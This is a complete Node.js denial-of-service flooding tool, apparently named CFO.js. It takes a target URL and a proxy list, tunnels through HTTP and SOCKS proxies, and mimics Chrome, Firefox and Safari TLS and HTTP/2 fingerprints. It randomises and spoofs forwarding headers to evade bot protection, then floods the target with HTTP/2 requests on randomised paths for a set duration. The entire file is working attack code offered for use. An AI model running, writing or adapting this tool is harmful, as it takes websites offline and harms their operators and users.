if (process.argv.length < 7) {
    console.log("node CFO.js [target] [duration] [rate] [delay] [proxies.txt]");
    process.exit(0);
}
const errorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);
Array.prototype.remove = function (item) {
    const index = this.indexOf(item);
    if (index !== -1) {
        this.splice(index, 1);
    }
    return item;
}
const crypto = require("crypto");
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const fs = require("fs");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
const args = {
    url: process.argv[2],
    time: process.argv[3],
    rate: process.argv[4],
    delay: process.argv[5],
    proxies: process.argv[6],
};
const readLines = path => fs.readFileSync(path).toString().split(/\r?\n/);
const randInt = (min, max) => Math.floor(Math.random() * (max - min) + min);
const randList = list => list[Math.floor(Math.random() * list.length)];
function randStr(input, length) {
    let output = "";
    for (let i = 0; i < length; i++) output += randList("qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890");
    return input.split("%rand%").join(output);
}
const proxies = readLines(args.proxies);
const target = new URL(args.url);
const rateHeaders = {
    "referer": "https://" + target.host + target.pathname,
    "origin": "https://" + target.host,
    "sec-ch-ua-arch": "x86",
    "sec-ch-ua-bitness": "64",
    "sec-ch-ua-model": "",
    "sec-ch-ua-platform-version": '"10.0.0"',
    "sec-ch-ua-wow64": "?0",
    "dnt": "1",
    "x-requested-with": "XMLHttpRequest",
    "x-forwarded-proto": "https",
    "x-forwarded-protocol": "https",
    "x-forwarded-port": "443",
    "x-forwarded-host": target.host,
    "sec-ch-ua-full-version": '"114.0.5735.90"',
    "sec-ch-ua-full-version-list": '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.90", "Google Chrome";v="114.0.5735.90"',
    "x-real-ip": address => "::ffff:" + address,
    "forwarded": address => "by=unknown;for=" + address + ";host=" + target.host + ";proto=https",
    "cookie": () => randStr("%rand%=%rand%", 4)
};
function randHeaders(range) {
    const address = randInt(1, 256) + "." + randInt(1, 256) + "." + randInt(1, 256) + "." + randInt(1, 256);
    const keys = Object.keys(rateHeaders);
    const headers = {};
    const length = randInt(1, range);
    for (let i = 0; i < length; i++) {
        const key = keys.remove(randList(keys));
        headers[key] = typeof rateHeaders[key] === "string" ? rateHeaders[key] : rateHeaders[key](address);
    }
    const rotateIP = Math.random() < 0.5 ? address.split(".").reverse().join(".") : address;
    const viaHeaders = [
        "1.1 ::ffff:" + rotateIP + " (Mikrotik HttpProxy)",
        "1.0 KobZ-Proxy (squid/3.3.8)",
        "1.1 " + rotateIP + " (Mikrotik HttpProxy)",
        "1.0 " + rotateIP + " (squid/4.7)",
        "1.0 proxy.wakoopa.com (squid/4.7)",
        "1.1 google"
    ];
    const via = randList(viaHeaders);
    return Math.random() < 0.5 ? {
        ...headers,
        "via": via
    } : {
        "via": via,
        ...headers
    };
}
const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
const secureOptions = crypto.constants.SSL_OP_ALL |
crypto.constants.SSL_OP_NO_SSLv2 |
crypto.constants.SSL_OP_NO_SSLv3 |
crypto.constants.SSL_OP_NO_TLSv1
crypto.constants.SSL_OP_NO_TLSv1_1 |
crypto.constants.ALPN_ENABLED |
crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
crypto.constants.SSL_OP_COOKIE_EXCHANGE |
crypto.constants.ENGINE_METHOD_EC;
const fingerPrints = [
    {
        // Chrome
        pseudo: {
            ":method": "GET",
            ":authority": target.host,
            ":scheme": "https",
            ":path": null
        },
        headers: {
            "accept-encoding": "gzip",
            "x-forwarded-for": null,
            "pragma": "no-cache",
            "cache-control": "no-cache",
            "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": null,
            "upgrade-insecure-requests": "1",
            "user-agent": null,
            "accept": null,
            "sec-fetch-site": "none",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            "sec-fetch-dest": "document",
            "accept-language": null
        },
        agents: [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5635.201 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5622.221 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5628.226 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5672.204 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5637.204 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.9911.30 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4367.61 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.3212.30 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5396.58 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.4588.75 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        ],
        settings: {
            headerTableSize: 65536,
            enablePush: false,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA"
    },
    // Firefox
    {
        pseudo: {
            ":method": "GET",
            ":path": null,
            ":authority": target.host,
            ":scheme": "https"
        },
        headers: {
            "accept-encoding": "gzip",
            "x-forwarded-for": null,
            "user-agent": null,
            "accept": null,
            "accept-language": null,
            "upgrade-insecure-requests": "1",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "pragma": "no-cache",
            "cache-control": "no-cache",
        },
        agents: [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.4; rv:109.0) Gecko/20100101 Firefox/114.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5; rv:113.0) Gecko/20110101 Firefox/113.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20010101 Firefox/114.0",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:114.0) Gecko/20000101 Firefox/114.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0"
        ],
        settings: {
            headerTableSize: 65536,
            initialWindowSize: 131072,
            maxFrameSize: 16384
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-RSA-AES256-SHA:AES128-GCM-SHA256:AES256-GCM-SHA384:AES128-SHA:AES256-SHA"
    },
    // Safari Desktop
    {
        pseudo: {
            ":method": "GET",
            ":scheme": "https",
            ":path": null,
            ":authority": target.host
        },
        headers: {
            "accept-encoding": "gzip",
            "x-forwarded-for": null,
            "accept": null,
            "pragma": "no-cache",
            "cache-control": "no-cache",
            "user-agent": null,
            "accept-language": null,
        },
        agents: [
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
        ],
        settings: {
            initialWindowSize: 4194304,
            maxConcurrentStreams: 100
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA:AES128-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:DES-CBC3-SHA"
    },
    // Safari Mobile
    {
        pseudo: {
            ":method": "GET",
            ":scheme": "https",
            ":path": null,
            ":authority": target.host
        },
        headers: {
            "accept-encoding": "gzip",
            "x-forwarded-for": null,
            "user-agent": null,
            "accept": null,
            "accept-language": null,
        },
        agents: [
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        ],
        settings: {
            initialWindowSize: 2097152,
            maxConcurrentStreams: 100
        },
        ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA:AES128-SHA:ECDHE-ECDSA-DES-CBC3-SHA:ECDHE-RSA-DES-CBC3-SHA:DES-CBC3-SHA"
    },
    // Custom
    {
        pseudo: {
            ":authority": target.host,
            ":method": "GET",
            ":path": null,
            ":scheme": "https"
        },
        headers: {
            "pragma": "no-cache",
            "x-forwarded-for": null,
            "cache-control": "no-cache",
            "accept-encoding": "gzip",
            "user-agent": null,
            "upgrade-insecure-requests": "1",
        },
        agents: [
            "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5638.217 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5633.207 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.221 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5623.200 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5650.210 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5659.194 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5652.224 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5625.214 Safari/537.36"
        ],
        settings: undefined,
        ciphers: undefined
    }
];
const ciphersList = [
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:TLS_AES_128_CCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA",
    "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:DHE-RSA-AES256-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES128-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA",
];
const accepts = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "*/*"
];
const languages = [
    "en",
    "en,en-US;q=0.9",
    "en,en-GB;q=0.9",
    "en,fr-FR;q=0.9,fr;q=0.8",
    "en,de;q=0.9",
    "en,it;q=0.9,it-IT;q=0.8",
    "en,fr-CA;q=0.9,fr;q=0.8",
    "vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6",
    "en,es;q=0.9,es-AR;q=0.8,es-MX;q=0.7",
    "en,tr;q=0.9",
    "en,ru;q=0.9",
    "fr,en-gb;q=0.7,en;q=0.3",
    "en-US,en;q=0.9",
    "en-US;q=0.5,en;q=0.3",
    "fr-CH,fr;q=0.9",
    "en;q=0.8,de;q=0.7",
    "de;q=0.7,*;q=0.5",
    "en-US,en;q=0.5",
    "es-mx,es,en",
    "vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3"
];
class Tunnel {
    HTTP(options, callback) {
        const buffer = Buffer.from("CONNECT " + options.address + " HTTP/1.1\r\nHost: " + options.address.split(":")[0] + "\r\nConnection: Keep-Alive\r\n\r\n");
        const socket = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });
        const timeout = setTimeout(() => {
            socket.destroy();
            return callback(undefined, "timeout");
        }, options.timeout * 1000);
        socket.on("connect", () => {
            clearTimeout(timeout);
            socket.write(buffer);
        });
        socket.on("data", data => {
            if (data.toString().indexOf("HTTP/1.1 200") !== -1) {
                return callback(socket, undefined);
            }
            socket.destroy();
            return callback(undefined, "not 200");
        });
        socket.on("error", error => {
            return callback(undefined, error);
        });
    }
    SOCKS4(options, callback) {
        const address = options.address.split(":");
        const addrHost = address[0];
        const addrPort = ~~address[1];
        const requestBuffer = new Buffer.alloc(10 + addrHost.length);
        requestBuffer[0] = 0x04;
        requestBuffer[1] = 0x01;
        requestBuffer[2] = addrPort >> 8;
        requestBuffer[3] = addrPort & 0xFF;
        requestBuffer[4] = 0x00;
        requestBuffer[5] = 0x00;
        requestBuffer[6] = 0x00;
        requestBuffer[7] = 0x01;
        requestBuffer[8] = 0x00;
        Buffer.from(addrHost).copy(requestBuffer, 9, 0, addrHost.length);
        requestBuffer[requestBuffer.length - 1] = 0x00;
        const socket = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });
        const timeout = setTimeout(function () {
            socket.destroy();
            return callback(undefined, "error: timeout exceeded");
        }, options.timeout * 1000);
        socket.on("connect", () => {
            clearTimeout(timeout);
            socket.write(requestBuffer);
        });
        socket.on("data", response => {
            if (response.length !== 8 || response[1] != 0x5A) {
                socket.destroy();
                return callback(undefined, "f");
            }
            return callback(socket, undefined);
        });
        socket.on("error", error => {
            return callback(undefined, error);
        });
    }
    SOCKS5(options, callback) {
        const address = options.address.split(":");
        const addrHost = address[0];
        const addrPort = ~~address[1];
        const greeting = Buffer.from([0x05, 0x01, 0x00]);
        const buffer = Buffer.alloc(addrHost.length + 7);
        buffer[0] = 0x05;
        buffer[1] = 0x01;
        buffer[2] = 0x00;
        buffer[3] = 0x03;
        buffer[4] = addrHost.length;
        Buffer.from(addrHost).copy(buffer, 5, 0, addrHost.length);
        buffer[buffer.length - 2] = addrPort >> 8;
        buffer[buffer.length - 1] = addrPort & 0xff;
        const socket = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });
        const timeout = setTimeout(function () {
            socket.destroy();
            return callback(undefined, "error: timeout exceeded");
        }, options.timeout * 1000);
        socket.on("connect", () => {
            clearTimeout(timeout);
            socket.write(greeting);
            socket.once("data", data => {
                if (data.length !== 2 || data[0] !== 0x05 || data[1] !== 0x00) {
                    socket.destroy();
                    return callback(undefined, "f");
                }
                socket.write(buffer);
                socket.on("data", data => {
                    if (data[0] !== 0x05 || data[1] !== 0x00) {
                        socket.destroy();
                        return callback(undefined, "rip");
                    }
                    return callback(socket, undefined);
                });
            });
        });
        socket.on("error", error => {
            return callback(undefined, error);
        });
    }
}
const tunnel = new Tunnel();
const protocols = {
    "http": tunnel.HTTP,
    "socks4": tunnel.SOCKS4,
    "socks5": tunnel.SOCKS5
};
function randSettings() {
    const outSettings = {};
    const initialWindowSize = 2 ** randInt(10, 32);
    const maxFrameSize = 2 ** randInt(14, 25);
    const settings = {
        headerTableSize: 2 ** randInt(6, 17),
        enablePush: false,
        maxConcurrentStreams: 2 ** randInt(6, 17),
        initialWindowSize: initialWindowSize === 2 ** 31 ? initialWindowSize - 1 : initialWindowSize,
        maxHeaderListSize: 2 ** randInt(10, 20),
        maxFrameSize: maxFrameSize === 2 ** 24 ? maxFrameSize - 1 : maxFrameSize
    };
    const keys = Object.keys(settings);
    const length = randInt(2, 7);
    for (let i = 0; i < length; i++) {
        const key = keys.remove(randList(keys));
        outSettings[key] = settings[key];
    }
    return outSettings;
}
function reverseHeaders(plusHeaders, headers) {
    return Math.random() < 0.5 ? { ...headers, ...plusHeaders } : { ...plusHeaders, ...headers }
}
const TLSOpts = {
    secureProtocol: "TLS_method",
    ALPNProtocols: ["h2", "http/1.1"],
    sessionTimeout: 5 * 1000,
    rejectUnauthorized: false,
    servername: target.host,
    honorCipherOrder: false,
    secureOptions: secureOptions,
    requestOCSP: true,
    sigalgs: sigalgs
};
function prepareAttack(session, fingerPrint) {
    const dynHeaders = {
        ...fingerPrint.pseudo,
        ...reverseHeaders(randHeaders(1), fingerPrint.headers)
    };
    for (let i = 0; i < args.rate; i++) {
        dynHeaders[":path"] = randStr(target.pathname + target.search, 8);
        const request = session.request(dynHeaders);
        request.setTimeout(1 * 1000);
        request.on("timeout", () => {
            request.close();
            request.destroy();
        });
        request.on("response", response => {
            request.close();
            request.destroy();
        });
        request.end();
    }
}
function runAttack() {
    const proxyURL = randList(proxies).split("://");
    const protocol = proxyURL[0];
    const proxy = proxyURL[1].split(":");
    const options = {
        host: proxy[0],
        port: ~~proxy[1],
        address: target.host + ":443",
        timeout: 5,
    };
    protocols[protocol](options, (socket, error) => {
        if (error) return;
        socket.setKeepAlive(true, 60 * 1000);
        TLSOpts.socket = socket;
        const fingerPrint = randList(fingerPrints);
        TLSOpts.ciphers = fingerPrint.ciphers || randList(ciphersList);
        const tlsConn = tls.connect(443, target.host, TLSOpts);
        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);
        tlsConn.on("OCSPResponse", () => {
            const session = http2.connect("https://" + target.host + target.pathname, {
                protocol: "https:",
                maxSessionMemory: 15,
                maxDeflateDynamicTableSize: 2 ** 32 - 1,
                settings: fingerPrint.settings || randSettings(),
                createConnection: () => tlsConn,
            });
            session.setMaxListeners(0);
            session.on("connect", () => {
                fingerPrint.headers["x-forwarded-for"] = proxy[0].split(".").reverse().join(".");
                fingerPrint.headers["user-agent"] = randList(fingerPrint.agents);
                if (fingerPrint.headers["sec-ch-ua-platform"] !== undefined) fingerPrint.headers["sec-ch-ua-platform"] = fingerPrint.headers["user-agent"].includes("Windows") ? '"Windows"' :  '"macOS"';
                if (fingerPrint.headers["accept"] !== undefined) fingerPrint.headers["accept"] = randList(accepts);
                if (fingerPrint.headers["accept-language"] !== undefined) fingerPrint.headers["accept-language"] = randList(languages);
                setInterval(function() {
                    if (!session.destroyed) prepareAttack(session, fingerPrint);
                }, args.delay);
            });
            session.on("error", error => error = undefined);
        });
        tlsConn.on("error", error => error = undefined);
        socket.on("error", error => error = undefined);
    });
}
const attackInterval = setInterval(runAttack, 0);
setTimeout(function() {
    clearInterval(attackInterval);
    process.exit(1);
}, args.time * 1000);
